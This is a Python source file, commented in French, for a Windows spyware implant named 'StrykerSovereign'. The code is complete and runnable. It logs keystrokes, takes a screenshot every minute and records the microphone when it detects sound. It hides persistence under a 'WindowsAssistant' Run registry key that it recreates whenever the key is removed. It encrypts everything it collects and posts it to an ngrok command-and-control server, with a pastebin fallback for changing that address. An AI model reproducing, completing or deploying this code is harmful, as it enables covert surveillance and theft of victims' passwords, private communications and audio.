import os, sys, json, base64, requests, time, threading, platform, io
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
from Cryptodome.Cipher import AES

# --- CONFIGURATION AVANCÉE ---
PRIMARY_C2 = "https://unwomanly-jugate-dorathy.ngrok-free.dev"
BACKUP_URL = "URL_PASTEBIN_OU_GITHUB_AVEC_TON_NGROK" # Double Tunnel
SECRET_KEY = b'12345678901234567890123456789012'

SYSTEM = platform.system()
if SYSTEM == "Windows":
    import winreg as reg
    from PIL import ImageGrab
    from pynput import keyboard

class StrykerSovereign:
    def __init__(self):
        self.c2 = PRIMARY_C2
        self.kb_buffer = ""
        self.threshold = 0.03 # Seuil du Trigger Intelligent

    def update_c2(self):
        """Double Tunnel : Cherche une nouvelle adresse si Ngrok change."""
        while True:
            try:
                r = requests.get(BACKUP_URL, timeout=10)
                if r.status_code == 200 and "ngrok" in r.text:
                    self.c2 = r.text.strip()
            except: pass
            time.sleep(3600) # Vérifie toutes les heures

    def encrypt_data(self, data):
        if isinstance(data, str): data = data.encode('utf-8')
        cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(nonce + tag + ciphertext).decode('utf-8')

    def send(self, dtype, data):
        enc = self.encrypt_data(data)
        try: requests.post(f"{self.c2}/exfil", json={"type": dtype, "data": enc}, timeout=15)
        except: pass

    # --- TRIGGER INTELLIGENT ---
    def smart_audio(self):
        fs = 44100
        while True:
            try:
                # Écoute 2 secondes pour tester le niveau
                rec = sd.rec(int(2 * fs), samplerate=fs, channels=1)
                sd.wait()
                if np.max(np.abs(rec)) > self.threshold:
                    # Si bruit détecté, enregistre 10 secondes
                    full_rec = sd.rec(int(10 * fs), samplerate=fs, channels=1)
                    sd.wait()
                    out = io.BytesIO()
                    write(out, fs, full_rec)
                    self.send("PC_AUDIO", out.getvalue())
            except: pass
            time.sleep(5)

    # --- PERSISTANCE ANTI-KILL ---
    def pc_persist(self):
        while True:
            try:
                p = os.path.realpath(sys.argv[0])
                key = reg.HKEY_CURRENT_USER
                path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with reg.OpenKey(key, path, 0, reg.KEY_WRITE) as k:
                    reg.SetValueEx(k, "WindowsAssistant", 0, reg.REG_SZ, p)
            except: pass
            time.sleep(60) # Recrée la clé si elle est supprimée

    def pc_screenshot(self):
        while True:
            try:
                img = ImageGrab.grab()
                b = io.BytesIO()
                img.save(b, format="PNG")
                self.send("PC_SCREEN", b.getvalue())
            except: pass
            time.sleep(60)

    def on_press(self, key):
        try: self.kb_buffer += key.char
        except: self.kb_buffer += f" [{key}] "
        if len(self.kb_buffer) > 100:
            self.send("PC_KEYS", self.kb_buffer)
            self.kb_buffer = ""

    def run(self):
        if SYSTEM == "Windows":
            threading.Thread(target=self.pc_persist, daemon=True).start()
            threading.Thread(target=self.update_c2, daemon=True).start()
            threading.Thread(target=self.pc_screenshot, daemon=True).start()
            threading.Thread(target=self.smart_audio, daemon=True).start()
            with keyboard.Listener(on_press=self.on_press) as l: l.join()

if __name__ == "__main__":
    StrykerSovereign().run()